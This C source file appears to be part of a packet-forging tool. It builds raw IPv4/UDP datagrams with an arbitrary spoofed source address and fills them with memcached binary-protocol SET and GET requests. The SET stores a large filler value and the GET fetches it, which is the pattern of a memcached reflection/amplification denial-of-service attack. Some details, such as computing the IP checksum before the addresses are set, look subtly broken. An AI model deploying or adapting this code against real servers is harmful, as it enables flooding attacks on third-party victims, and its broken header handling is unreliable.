#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <sys/types.h>

#include "c.h"
#include "packetforge.h"
#include "memcached.h"

static uint16_t ip_checksum(const void *buf, size_t hdr_len)
{
  unsigned long sum = 0;
  const uint16_t *ip1;
 
  ip1 = buf;
  while (hdr_len > 1){
    sum += *ip1++;
    if (sum & 0x80000000)
    sum = (sum & 0xFFFF) + (sum >> 16);
    hdr_len -= 2;
  }
 
  while (sum >> 16){
    sum = (sum & 0xFFFF) + (sum >> 16);
  }

  return(~sum);
}

static Packet * forgeUDP(Pointer ip_dest, Pointer ip_src, int dest_port, int src_port, Pointer payload_data, int payload_size)
{
  
  Packet *pac = NULL;
  memalloc( (void *)&pac, sizeof(Packet), __func__);
  
  Pointer datagram;
  memalloc( (void *)&datagram, sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size, __func__);

  struct iphdr *ip_header = (struct iphdr *)datagram;                                  // Pointer to the beginning of ip header
  struct udphdr *udp_header = (struct udphdr *)(datagram + sizeof(struct iphdr));   // Pointer to the beginning of udp header
    
  Pointer payload_ptr = (datagram + sizeof(struct iphdr) + sizeof(struct udphdr));               // Pointer to the beginning of payload
  
  if(NULL != payload_data){
    memcpy(payload_ptr, payload_data, payload_size);
  }

  //IP Header
  ip_header->version = 4;
  ip_header->ihl = 5;
  ip_header->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + payload_size;
  ip_header->tos = 0;
  ip_header->frag_off = 0;		    // no fragment = 0
  ip_header->ttl = 64;			    // default value = 64
  ip_header->protocol = IPPROTO_UDP;
  ip_header->check = ip_checksum(datagram, ip_header->tot_len);
  inet_pton(AF_INET, ip_dest, (struct in_addr *)&ip_header->daddr);
  inet_pton(AF_INET, ip_src, (struct in_addr *)&ip_header->saddr);

  //UDP header
  udp_header->source = htons(src_port);
  udp_header->dest = htons(dest_port);
  udp_header->len = htons(sizeof(struct udphdr) + payload_size);
  udp_header->check = 0;
  
  pac->packet_ptr = datagram;
  pac->size = ip_header->tot_len;
  pac->type = IPPROTO_UDP;

  return pac;
}

static Packet * forgeMemcached( int opcode )
{

  Packet *pac = NULL;
  Pointer mem_packet;
  MemcachedRequestHeader * mem_header = NULL; 
  MemcachedSetExtra * extra = NULL;
  uint32_t * key = NULL;
  int packetSize = 0;

  memalloc( (void *)&pac, sizeof(Packet), __func__);

  switch( opcode ){
    case MEMCACHED_GET :
      packetSize = sizeof( MemcachedRequestHeader ) + MAXSIZE_MEMCACHED_KEY;
      memalloc( (void *)&mem_packet, packetSize, __func__);
  
      mem_header = ( MemcachedRequestHeader *) mem_packet;

      key = ( uint32_t * ) (mem_packet + sizeof( MemcachedRequestHeader ));

      mem_header->magic = 0x80;
      mem_header->opcode = 0x00;
      mem_header->key_length = ntohs(MAXSIZE_MEMCACHED_KEY);
      mem_header->extras_length = 0x00;
      mem_header->data_type = 0x00;
      mem_header->vbucket_id = 0x0000;
      mem_header->tot_length = ntohl(MAXSIZE_MEMCACHED_KEY);
      mem_header->opaque = 0x00000000;
      mem_header->cas = 0x0000000000000000;

      *key =  ntohl(MEMCACHED_KEY);
      
      pac->type = MEMCACHED_GET;

      break;
    case MEMCACHED_SET :
      packetSize = sizeof( MemcachedRequestHeader ) + sizeof( MemcachedSetExtra ) + MAXSIZE_MEMCACHED_KEY + MAXSIZE_MEMCACHED_VALUE;
      memalloc( (void *)&mem_packet, packetSize, __func__);
  
      mem_header = ( MemcachedRequestHeader *) mem_packet;
      extra = ( MemcachedSetExtra * ) (mem_packet + sizeof( MemcachedRequestHeader ));

      key = ( uint32_t * ) (mem_packet + sizeof( MemcachedRequestHeader ) + sizeof( MemcachedSetExtra ));
      Pointer value = (mem_packet + sizeof( MemcachedRequestHeader ) + sizeof( MemcachedSetExtra ) + MAXSIZE_MEMCACHED_KEY);

      mem_header->magic = 0x80;
      mem_header->opcode = 0x01;
      mem_header->key_length = ntohs(MAXSIZE_MEMCACHED_KEY);
      mem_header->extras_length = sizeof( MemcachedSetExtra );
      mem_header->data_type = 0x00;
      mem_header->vbucket_id = 0x0000;
      mem_header->tot_length = ntohl(sizeof( MemcachedSetExtra ) + MAXSIZE_MEMCACHED_KEY + MAXSIZE_MEMCACHED_VALUE);
      mem_header->opaque = 0x00000000;
      mem_header->cas = 0x0000000000000000;

      extra->flags = ntohl(0xdeadbeef);
      extra->expiration = ntohl(0x151800);
      
      *key =  ntohl(MEMCACHED_KEY);
      memset(value, '-', MAXSIZE_MEMCACHED_VALUE);

      pac->type = MEMCACHED_SET;
      break;
  }
  
  pac->packet_ptr = mem_packet;
  pac->size = packetSize;
  return pac;
}

Packet * ForgeMemcachedUDP(Pointer ip_dest, Pointer ip_src, int dest_port, int src_port, int opcode)
{
  Packet *pac = NULL;
  Packet *memcachedPac;
   
  memalloc( (void *)&pac, sizeof(Packet), __func__ );

  switch( opcode ){
    case MEMCACHED_GET:
      pac->type = MEMCACHED_GET;    
      break;

    case MEMCACHED_SET:
      pac->type = MEMCACHED_SET; 
      break;
    
    default:
      fatal_error( "Packet Forge opcode error" );      
  }
  

  memcachedPac = forgeMemcached(pac->type);
  pac = forgeUDP( ip_dest, ip_src, dest_port, src_port, memcachedPac->packet_ptr, memcachedPac->size);
  
  release_packet(&memcachedPac);

  return pac;
}

void release_packet( Packet ** p_pkt)
{
  if(NULL != *p_pkt){
    free((*p_pkt)->packet_ptr);
    free(*p_pkt);
    *p_pkt = NULL;
  }
}

